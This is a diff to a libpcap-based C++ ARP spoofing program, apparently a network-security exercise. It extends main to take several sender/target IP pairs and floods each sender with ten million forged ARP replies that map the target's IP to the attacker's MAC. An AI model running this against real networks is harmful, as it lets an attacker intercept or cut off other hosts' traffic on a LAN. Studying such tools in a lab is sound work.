@@ -309,7 +309,7 @@ void send_arp_reply(pcap_t* handle, const char* dev, const Ip& target_ip, Mac& m
 }
 
 int main(int argc, char* argv[]) {
-    if (argc != 4) { // 3개의 매개변수가 필요함
+    if (argc < 4 or argc % 2 == 1) {
         usage();
         return -1;
     }
@@ -324,35 +324,33 @@ int main(int argc, char* argv[]) {
     Mac my_mac(MY_macAddress);
 
     char* dev = argv[1];
-    Ip sender_ip(argv[2]);
-    Ip target_ip(argv[3]);
 
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-    if (handle == nullptr) {
-        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-        return -1;
-    }
+    for(int i=1; 2*i+1 < argc; i++){
+        int a = 2*i;
+        Ip sender_ip(argv[a]);
+        Ip target_ip(argv[a+1]);
 
-    Mac sender_mac;
-    if (!getMacAddress(handle, dev, my_ip, my_mac, sender_ip, sender_mac)) {
-        fprintf(stderr, "Failed to get MAC address for IP %s\n", argv[3]);
+        char errbuf[PCAP_ERRBUF_SIZE];
+        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+        if (handle == nullptr) {
+            fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+            return -1;
+        }
+
+        Mac sender_mac;
+        if (!getMacAddress(handle, dev, my_ip, my_mac, sender_ip, sender_mac)) {
+            fprintf(stderr, "Failed to get MAC address for IP %s\n", argv[a]);
+            pcap_close(handle);
+            return -1;
+        }
+
+        for(int j=0;j<10000000;j++){
+            send_arp_reply(handle, dev, target_ip, my_mac, sender_ip, sender_mac);
+        }
+
         pcap_close(handle);
-        return -1;
     }
 
-    // Mac target_mac;
-    // if (!getMacAddress(handle, dev, my_ip, my_mac, target_ip, target_mac)) {
-    //     fprintf(stderr, "Failed to get MAC address for IP %s\n", argv[3]);
-    //     pcap_close(handle);
-    //     return -1;
-    // }
-
-    while(true){
-        send_arp_reply(handle, dev, target_ip, my_mac, sender_ip, sender_mac);
-    }
-
-    pcap_close(handle);
     return 0;
 }
 
